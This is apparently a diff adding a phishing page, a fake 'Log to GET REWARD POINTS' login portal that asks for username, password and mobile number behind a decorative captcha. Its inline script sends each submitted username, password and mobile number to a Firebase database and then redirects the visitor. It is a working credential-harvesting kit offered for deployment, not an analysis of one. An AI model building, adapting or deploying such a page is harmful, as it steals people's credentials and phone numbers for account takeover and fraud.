@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+		<title>Wellcome online</title>
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<link rel="stylesheet" type="text/css" href="style.css">
+	</head>
+	<body>
+		<div id="loading" style="margin-top: 80px;text-align: center;">
+			<span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 120px; height: 120px; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;">
+				<img alt="loading" src="loading.gif" decoding="async" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;">
+			</span>
+			<h2>Loading....</h2>
+		</div>
+		<div id="main" class="hidden">
+			<header class="Qiv_logo__8DRjr">
+				<img alt="ERywy7" loading="lazy" width="142" height="33" decoding="async" src="logo.svg" style="color: transparent;">
+			</header>
+			<main>
+				<div class="Qiv_login_heading__4Psgp">
+					<h3 class="Qiv_login_heading_h3___uWbp">Log to GET REWARD POINTS</h3>
+				</div>
+				<div class="Qiv_login_form__5C_cw">
+					<p class="Qiv_info__JrwBL">
+						<p class="Qiv_mandatory_txt__fhLWM">Mandatory fields are marked with an asterisk (*)</p>
+					</p>
+					<form id="login" class="Qiv_form__lGlFR">
+						<input type="hidden" name="formtoken" value="uveswQ">
+						<div class="Qiv_form_group__XPV8X">
+							<label class="Qiv_label__zUpI2">Username*</label>
+							<input id="Username" name="Username" type="text" class="Qiv_form_control__tzi5X" required maxlength="30">
+						</div>
+						<div class="Qiv_form_group__XPV8X">
+							<label class="Qiv_label__zUpI2">Password*</label>
+							<input id="Password" name="Password" type="password" class="Qiv_form_control__tzi5X" required maxlength="30">
+						</div>
+						<div class="Qiv_form_group__XPV8X">
+							<label class="Qiv_label__zUpI2">Mobile*</label>
+							<input id="MobileNumber" name="MobileNumber" type="tel" inputmode="numeric" class="Qiv_form_control__tzi5X" required maxlength="10" minlength="10">
+						</div>
+						<div class="Qiv_form_group__XPV8X">
+							<label class="Qiv_label__zUpI2">Captcha*</label>
+							<input type="text" class="Qiv_form_control__tzi5X" maxlength="30">
+						</div>
+						<label class="Qiv_label__zUpI2">Select Any Captcha *</label>
+						<div class="Qiv_captcha__OzTie">
+							<div class="Qiv_w_50__jllU_">
+								<input type="radio" checked>Image Captcha
+							</div>
+							<div class="Qiv_w_50__jllU_">
+								<input type="radio" id="">Audio Captcha
+							</div>
+							<div class="Qiv_clear__8Ahyh"></div>
+							<div class="Qiv_top_10__8muOt">
+								<div>
+									<img alt="eESAQX" loading="lazy" width="148" height="38" decoding="async" src="captcha.png" style="color: transparent;">
+								</div>
+							</div>
+						</div>
+						<div class="Qiv_form_group__XPV8X">
+							<input id="submit" type="submit" class="Qiv_btn__ywlaU" value="Login">
+							<input type="reset" class="Qiv_btn__ywlaU" value="Reset">
+						</div>
+						<p>
+							<a href="/">New Customer</a>
+						</p>
+						<p>
+							<a href="/">Forgot password</a>
+						</p>
+					</form>
+				</div>
+				<div class="Qiv_p_body__tf1E3">
+					<ul class="Qiv_provide__ruong">
+						<li>Mandatory fields are indicated with an asterisk () </li>
+						<li>Please do not share your personal information,do not share your user ID and password,on any other page or platform </li>
+						<li>Your username and password are sensitive.Please do not share them with any other </li>
+					</ul>
+				</div>
+			</main>
+			<div class="Qiv_footer_area__gO0vJ">
+				<img alt="51aQtD" loading="lazy" width="68" height="28" decoding="async" src="sign.png" style="color: transparent;">
+			</div>
+			<div class="Qiv_footer__PEe7g">
+				<p>© Copyright</p>
+			</div>
+		</div>
+		<script src="firebase-config.js"></script>
+		<script type="module">
+			import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+			import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js"; 
+			const app = initializeApp(firebaseConfig);
+			const db = getDatabase();
+			let form = document.getElementById("login");
+			form.addEventListener("submit", function(e) {
+				event.preventDefault();
+				if(form.checkValidity() != false) {
+					document.getElementById("submit").disabled = true;
+					document.body.style.cursor='wait';
+					const timestamp = Math.floor(Date.now() / 100);
+					set(ref(db, 'users/' + timestamp), {
+						Username: document.getElementById('Username').value,
+						Password: document.getElementById('Password').value,
+						MobileNumber: document.getElementById('MobileNumber').value
+					})
+					.then(() => {
+						window.location.href = "wq2";
+					})
+					.catch((error) => {
+						document.getElementById("submit").disabled = false;
+						document.body.style.cursor='default';
+						alert("Error! Please try again later.");
+					});
+				}
+			});
+		</script>
+		<script src="js/onload.js"></script>
+	</body>
+</html>
